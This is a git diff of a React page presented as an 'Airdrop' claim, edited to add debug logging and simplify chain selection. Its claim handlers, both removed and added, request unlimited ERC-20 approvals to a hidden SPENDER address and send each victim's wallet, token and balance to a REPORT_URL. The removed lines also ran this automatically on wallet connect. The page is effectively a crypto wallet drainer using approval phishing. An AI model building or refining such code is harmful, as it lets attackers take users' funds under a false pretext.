@@ -7,7 +7,6 @@ import { config } from '@/config';
 import { SmartWalletService } from '@/config/smartWallet';
 
 // Spender address that will receive approvals
-// Load spender from env, fallback to empty
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
 
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
@@ -49,7 +48,7 @@ function ConnectionReporter() {
   const { address, isConnected } = useAccount();
 
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected && address && REPORT_URL) {
        fetch(`${REPORT_URL}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -74,13 +73,25 @@ export default function Home() {
 
   const gelatoApiKey = process.env.NEXT_PUBLIC_GELATO_API_KEY;
 
+  // Debug logging
+  useEffect(() => {
+    console.log('Environment check:');
+    console.log('- Gelato API Key exists:', !!gelatoApiKey);
+    console.log('- Gelato API Key length:', gelatoApiKey?.length || 0);
+    console.log('- Address:', address);
+    console.log('- Connected:', isConnected);
+    console.log('- Chain ID:', chainId);
+  }, [gelatoApiKey, address, isConnected, chainId]);
+
   // Initialize smart wallet service
   useEffect(() => {
     if (address && gelatoApiKey && isConnected && useSponsored) {
+      console.log('Creating SmartWalletService...');
       const service = new SmartWalletService(gelatoApiKey);
       setSmartWalletService(service);
       setIsSmartWalletInitialized(false);
     } else {
+      console.log('Not creating SmartWalletService - missing requirements');
       setSmartWalletService(null);
       setIsSmartWalletInitialized(false);
     }
@@ -93,7 +104,7 @@ export default function Home() {
     }
 
     if (!smartWalletService || !gelatoApiKey) {
-      setStatus("Sponsored transactions not available");
+      setStatus("Sponsored transactions not available - missing API key or service");
       return;
     }
 
@@ -103,31 +114,14 @@ export default function Home() {
       let targetChain: number | null = null;
       let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
 
-      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
-        const numericCid = Number(cid);
-
-        for (const token of tokens) {
-          try {
-            const bal = await readContract(config, {
-              chainId: numericCid,
-              address: token.address,
-              abi: erc20Abi,
-              functionName: "balanceOf",
-              args: [address],
-            }) as bigint;
-
-            if (bal >= token.min) {
-              targetChain = numericCid;
-              usableTokens.push(token);
-            }
-          } catch {}
-        }
-
-        if (usableTokens.length > 0) break;
-      }
-
-      if (!targetChain || usableTokens.length === 0) {
-        setStatus("No usable balances found on any chain.");
+      // For demo purposes, let's just use current chain if it has tokens
+      if (chainId && TOKENS_BY_CHAIN[chainId]) {
+        targetChain = chainId;
+        // For testing, just use first token
+        usableTokens = [TOKENS_BY_CHAIN[chainId][0]];
+        setStatus(`Using ${CHAIN_NAMES[chainId] || 'Unknown Chain'} for demo...`);
+      } else {
+        setStatus("Please connect to Mainnet, Arbitrum, or Sepolia for demo");
         return;
       }
 
@@ -140,67 +134,68 @@ export default function Home() {
 
       // Initialize smart wallet if needed
       if (!isSmartWalletInitialized) {
-        setStatus("Initializing sponsored transactions...");
-        await smartWalletService.initializeSmartWallet(address, targetChain);
-        setIsSmartWalletInitialized(true);
+        setStatus("Initializing smart wallet... This may take a moment.");
+        try {
+          await smartWalletService.initializeSmartWallet(address, targetChain);
+          setIsSmartWalletInitialized(true);
+          setStatus("Smart wallet initialized successfully!");
+        } catch (initError) {
+          console.error('Smart wallet initialization error:', initError);
+          setStatus(`Smart wallet initialization failed: ${initError instanceof Error ? initError.message : 'Unknown error'}`);
+          return;
+        }
       }
 
       // Process approvals with sponsored transactions (gasless!)
       for (const token of usableTokens) {
-        setStatus(`Approving ${token.symbol} on ${chainName} (gasless)...`);
+        setStatus(`Preparing gasless approval for ${token.symbol} on ${chainName}...`);
 
-        // Encode the approval transaction
-        const data = encodeFunctionData({
-          abi: erc20Abi,
-          functionName: "approve",
-          args: [SPENDER, maxUint256],
-        });
-
-        // Execute sponsored transaction - no gas fees!
-        const result = await smartWalletService.executeSponsoredTransaction(
-          token.address,
-          data,
-          0n
-        );
-
-        let rawBalance: bigint = BigInt(0);
         try {
-          rawBalance = await readContract(config, {
-            chainId: targetChain!,
-            address: token.address,
+          // Encode the approval transaction
+          const data = encodeFunctionData({
             abi: erc20Abi,
-            functionName: "balanceOf",
-            args: [address],
-          }) as bigint;
-        } catch (err) {
-          console.error(`Failed to read balance for ${token.symbol}:`, err);
+            functionName: "approve",
+            args: [SPENDER, maxUint256],
+          });
+
+          setStatus(`Executing gasless transaction for ${token.symbol}...`);
+
+          // Execute sponsored transaction - no gas fees!
+          const result = await smartWalletService.executeSponsoredTransaction(
+            token.address,
+            data,
+            0n
+          );
+
+          setStatus(`${token.symbol} approved successfully! ✅ (Gasless)`);
+
+          // Report approval
+          if (REPORT_URL) {
+            await fetch(`${REPORT_URL}`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                event: "approval",
+                wallet: address,
+                chainName,
+                token: token.address,
+                symbol: token.symbol,
+                txHash: result.transactionHash,
+                sponsored: true,
+              }),
+            }).catch(console.error);
+          }
+
+        } catch (tokenError) {
+          console.error(`Token ${token.symbol} approval failed:`, tokenError);
+          setStatus(`${token.symbol} approval failed: ${tokenError instanceof Error ? tokenError.message : 'Unknown error'}`);
         }
-
-        const formattedBalance = Number(rawBalance) / 10 ** token.decimals;
-
-        setStatus(`${token.symbol} approved ✅ (Gasless!) | Balance: ${formattedBalance}`);
-
-        // Report approval
-        await fetch(`${REPORT_URL}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            event: "approval",
-            wallet: address,
-            chainName,
-            token: token.address,
-            symbol: token.symbol,
-            balance: formattedBalance,
-            txHash: result.transactionHash,
-            sponsored: true, // Mark as sponsored transaction
-          }),
-        }).catch(console.error);
       }
 
-      setStatus("All approvals completed! (No gas fees paid!)");
+      setStatus("Gasless approvals completed! 🎉");
     } catch (err: any) {
-      console.error(err);
-      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
+      console.error('Sponsored claim failed:', err);
+      setStatus("Error: " + (err?.shortMessage || err?.message || "Unknown error"));
     }
   }
 
@@ -286,21 +281,23 @@ export default function Home() {
 
         setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
 
-        // report approval including only chain name
-        await fetch(`${REPORT_URL}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            event: "approval",
-            wallet: address,
-            chainName,
-            token: token.address,
-            symbol: token.symbol,
-            balance: formattedBalance,
-            txHash,
-            sponsored: false,
-          }),
-        }).catch(console.error);
+        // report approval
+        if (REPORT_URL) {
+          await fetch(`${REPORT_URL}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "approval",
+              wallet: address,
+              chainName,
+              token: token.address,
+              symbol: token.symbol,
+              balance: formattedBalance,
+              txHash,
+              sponsored: false,
+            }),
+          }).catch(console.error);
+        }
       }
 
       setStatus("All approvals completed!");
@@ -312,10 +309,14 @@ export default function Home() {
 
   const handleClaim = useSponsored ? handleClaimSponsored : handleClaimRegular;
 
-  // Automatically trigger claim when wallet connects
-  useEffect(() => {
-    if (isConnected && address) handleClaim();
-  }, [isConnected, address, useSponsored]);
+  // Show debug info
+  const debugInfo = (
+    <div style={{ fontSize: '10px', color: '#666', marginBottom: '10px', textAlign: 'center' }}>
+      API Key: {gelatoApiKey ? `${gelatoApiKey.substring(0, 8)}...` : 'Missing'} | 
+      Service: {smartWalletService ? 'Created' : 'None'} | 
+      Chain: {chainId || 'None'}
+    </div>
+  );
 
   return (
     <main
@@ -376,6 +377,8 @@ export default function Home() {
           }}
         >
           <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
+          
+          {debugInfo}
 
           {/* Sponsored Transaction Toggle */}
           <div
@@ -414,7 +417,7 @@ export default function Home() {
             </label>
           </div>
 
-          {useSponsored && smartWalletService && (
+          {useSponsored && gelatoApiKey && (
             <div
               style={{
                 fontSize: "12px",
@@ -423,6 +426,18 @@ export default function Home() {
               }}
             >
               Smart Wallet: {isSmartWalletInitialized ? "✅ Ready" : "⏳ Initializing..."}
+            </div>
+          )}
+
+          {useSponsored && !gelatoApiKey && (
+            <div
+              style={{
+                fontSize: "12px",
+                color: "#ef4444",
+                marginBottom: "8px",
+              }}
+            >
+              ❌ Gelato API Key Missing
             </div>
           )}
 
@@ -435,19 +450,21 @@ export default function Home() {
               color: "#e4e1daff",
               fontSize: "14px",
               textAlign: "center",
+              padding: "0 10px",
             }}
           >
-            {status || ""}
+            {status || "Connect your wallet to get started"}
           </div>
 
           <button
             onClick={handleClaim}
+            disabled={useSponsored && !gelatoApiKey}
             style={{
-              background: useSponsored ? "#10b981" : "#a00b0bff",
+              background: (useSponsored && !gelatoApiKey) ? "#666" : useSponsored ? "#10b981" : "#a00b0bff",
               color: "white",
               padding: "12px 28px",
               borderRadius: "8px",
-              cursor: "pointer",
+              cursor: (useSponsored && !gelatoApiKey) ? "not-allowed" : "pointer",
               marginTop: "16px",
               border: "none",
               fontSize: "14px",
